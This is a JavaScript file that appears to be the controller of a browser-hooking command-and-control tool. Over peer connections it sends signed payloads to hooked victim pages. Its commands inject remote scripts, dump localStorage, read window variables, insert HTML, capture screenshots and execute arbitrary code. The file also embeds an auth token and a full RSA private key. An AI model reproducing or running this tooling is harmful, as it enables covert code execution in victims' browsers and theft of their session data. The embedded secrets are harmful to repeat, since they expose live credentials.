const socket = io("/admin", {
    auth: {
        token: "2f35c1073c86b7087a504ad9183f6a24ced9f49a7b29f5aac60acccadd62cafb"
    }
});
var peer = new Peer();
var currentConnection;
var _keys = {
    "private": `-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAgM3dP9S6/jPsOmr86T7GJxFZZurxKAjmn7Y803YAim1mwMuf
/pwgUiebkIw74UWOHbEJPG2BP6fPgH0mt773E5Uf24/fin23cABAFqD9bzaec2I7
p6KYzFiUncsyRXQpQ7LsY+zHnjreOro4ZWFhDET7+DAwAAm65paZzsLfYqy1WKTC
v/CG7f4jcKkqnnakcbBJsUFEPUpAW0AJkwGKANOF19JiWkqBtghzL4Su1vEBQQzn
rYc9+ItGGXMwhsvMb+WfJht8g5R3suCwvmB8r4EZxUss1ilzNrvMm/D4B5tBjyIn
yT68Yq9Ti8cHywRafoaLk54fZKklcJf9QovytQIDAQABAoIBAHD5oGVbZsSOsFWw
/7Jp4A3mVr9BtVJDNF3Dz2g+qUzBlo3mTKhbMrI8kWNgzSjTBEsgvBQnjGVUAFoX
67zhIAAqHa5MbGshx6LSZWQzwvcoNiTIdcCcil86FuiskKSAtazupA8lYRV1VvS1
3790gVXssAFJ6uAtqKSWVcQYAy2dPiAmqbIWa8Oi+pu9ysCzLAbM0R1Kux8nNXWn
eDgVTvtkD+d8QcnvS4pbga0px3/rQu6IbJrlqi8Zc52UugasrAIg6rrpKFwtZ4rn
+yB7JjK9sPSpdRJ4TY8SB8JwYQgcniYBmk9TqawNOlv1LsW1J6cvW+ZH0oH2Ejdd
TExJ2MUCgYEA457gcEjrl7CrVJ/6tTHQJgOEpnSwIybDCTlSUs1oH9TTt9mnKdfh
H4EvEybBUN4nx1Oto0q8VgenHqdXtWKFLISZCqJkW6hCTCX7f21sSGHLP9fqzrjk
Rc2u19CGPF0PRt55R1e0SGks3YL3nIbt6I2eRbPNB6pGbYjJwsCvx8MCgYEAkNz+
tCBqiqTS4DUQ2hbD3/CNMjltiiDoZY5rnVy8K2NNb8SVoHP6PqEJnX1KiVY4qYTu
hsJhkTb6OO83vXvK8r3Y3sONW5wxnKU3yXRN89XXN9qwEGRwld6pBCXssnsdPfdX
lfRqaiSCLb11jsPmEvkp/iOZomJObW/N0gDlLCcCgYAO8tAqj59pRuD5ncgJPkw9
Mt3zUJaAuHr2kB0n8vVzobaFzHV9+f9+4i0FRPZNKUnTfVtZ7f6QZ9BB4xuPffjh
A5RJboDIxDQWbCgoJjeGSWXfu35gNSRIsUlaQweNz07BiLrORKRCXSXlJkS8st/M
9f/+89/zMOuPJfyaHa1toQKBgF+o37T41wIY13vg7vDlKZGems64p4IYOv6dLqkq
jMOl/oO48AmVrIFg/CV4kBjiy+X9dzmb8Kvg/xlLtqY0sg7bmPN5dMYy/XvwikdI
uxUyd71VdwBMIyCEeV3Y4VX3AJdj1v2Z+g9/bktgGdoduLd8u+MrhQ97FUklFGgB
2VPvAoGAMwvoDDm0sFYxZHcA0WiLD7iDAWzIRAf+IQ0F/+kcinjhfX203kexpFjI
K/PXkv9BYOx2O+FNA100miyWE0Yhu72Ycf+AkYbVSBBYvqZkNNmXJxsujfoI2wYF
oN0YwWr7kop0ylOGS203xbnHESAwRIoIyzpFCaQfO8gEb89taU4=
-----END RSA PRIVATE KEY-----`,
    "public": `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAgM3dP9S6/jPsOmr86T7G
JxFZZurxKAjmn7Y803YAim1mwMuf/pwgUiebkIw74UWOHbEJPG2BP6fPgH0mt773
E5Uf24/fin23cABAFqD9bzaec2I7p6KYzFiUncsyRXQpQ7LsY+zHnjreOro4ZWFh
DET7+DAwAAm65paZzsLfYqy1WKTCv/CG7f4jcKkqnnakcbBJsUFEPUpAW0AJkwGK
ANOF19JiWkqBtghzL4Su1vEBQQznrYc9+ItGGXMwhsvMb+WfJht8g5R3suCwvmB8
r4EZxUss1ilzNrvMm/D4B5tBjyInyT68Yq9Ti8cHywRafoaLk54fZKklcJf9Qovy
tQIDAQAB
-----END PUBLIC KEY-----`
}

function connect(id) {
    var conn = peer.connect(id);
    currentConnection = conn;
    conn.on('open', function() {
        console.log("connected to peer:", id);
        // Receive messages
        conn.on('data', function(data) {
            console.log('Received:', data);
        });

        // Send messages
        // conn.send('Hello!');
    });

    conn.on('error', function(err) {
        console.error('Connection error:', err);
    });
}

async function sendCMD(type,data) {
    switch (type){
        case "inject":
            await SendPackagedCode(`
                (function() {
                    var j = document.createElement("script");
                    j.src = '${data}';
                    j.onload = function() {
                        _return(true);
                    }
                    document.body.appendChild(j);
                })();    
            `)
        break;
        case "screeshot":
        
        break;
        case "info": 
            await SendPackagedCode(`
                _return({
                    "hash": window.location.hash,
                    "host": window.location.host,
                    "hostname": window.location.hostname,
                    "href": window.location.href,
                    "origin": window.location.origin,
                    "pathname": window.location.pathname,
                    "port": window.location.port,
                    "protocol": window.location.protocol
                });    
            `)  
        break;
        case "localstorage":
            await SendPackagedCode(`
               _return(JSON.stringify(localStorage));  
            `)
        break;
        case "code":
            await SendPackagedCode(data);
        break;
        case "varibles":
            if (data == undefined) {
                await SendPackagedCode(`
                    (function() {
                        var _p = Object.keys(window).filter(prop => !built_in.includes(prop));
                        var _r = {};
                        for (var i in _p) {
                            _r[_p[i]] = typeof window[_p[i]]
                        }
                        _return(_r);
                    })(); 
                    
                `)
            }else {
                await SendPackagedCode(`
                    _return(window["${data}"]);    
                `)
            }
        break;
        case "addElm":
            await SendPackagedCode(`
                (function() {
                    var _p = document.createElement("div");
                    _p.innerHTML = atob("${btoa(data)}")
                    document.body.appendChild(_p);
                    _return(true);
                })();    
            `)
        break;
        case "screenShot": 
        await SendPackagedCode(`
            (function() {
                html2canvas(document.querySelector("html")).then(canvas => {
                     _return(canvas.toDataURL("image/png").replace("image/png", "image/octet-stream"));
                });
            })();    
        `)
        break;
        
        case "help":
            console.log("COMMANDS:","inject","info","localstorage","code","varibles","addElm","screenShot");
        break;
        default: 
        console.log("Type not found");
    }
}

async function SendPackagedCode(code) {
    try {
        await currentConnection.send({
            "code": btoa(code),
            "key": sign_cmd(currentConnection.peer)
        });
        return true;
    }catch {
        return false;
    }
}

function sign_cmd(user) {
    return doSign(_keys.private,user);
}


socket.on('connect', () => {
    console.log("socket connected");
    setTimeout(() => {
        socket.emit("getHooks", "");
    });
});

socket.on("hooks", (data) => {
    console.log(data);
    // if (data && data.length > 0) {
    //     connect(data[0].peer); // Assuming data contains peer IDs
    // }
});


var newKeyPair = {
    public: "",
    private: ""
  }
  
function genKeyPair() {
    crypt = new JSEncrypt({
      default_key_size: 2048
    });
  var dt = new Date();
  var time = -(dt.getTime());
  crypt.getKey();
  dt = new Date();
  time += (dt.getTime());
  
  newKeyPair.private = crypt.getPrivateKey();
  newKeyPair.public = crypt.getPublicKey();
  console.log(newKeyPair.private,"\n",newKeyPair.public);
  return newKeyPair;
}

function pemToArrayBuffer(pem) {
    const b64Lines = pem.replace(/-----[^-]+-----/g, "").trim();
    const b64String = b64Lines.replace(/\s+/g, '');
    const byteArray = Uint8Array.from(atob(b64String), char => char.charCodeAt(0));
    return byteArray.buffer;
}

      
function doSign(pkey,str) {
    var rsa = new RSAKey();
    rsa.readPrivateKeyFromPEMString(pkey);
    var hashAlg = 'sha256';
    var hSig = rsa.sign(str, hashAlg);
    return linebrk(hSig, 64);
}
  
function doVerify(pubkey,str,verif) {
    //Public key, encoded string, signed string 
    var sMsg = str;
    var hSig = verif;
    hSig = hSig.replace(/[^0-9a-f]+/g, "");
  
    var pubKey = KEYUTIL.getKey(pubkey);
    console.log(pubKey)
    var isValid = pubKey.verify(sMsg, hSig);
    console.log(isValid)
    // display verification result
    if (isValid) {
      console.log("Valid");
    } else {
     console.log("invalid");
    }
}
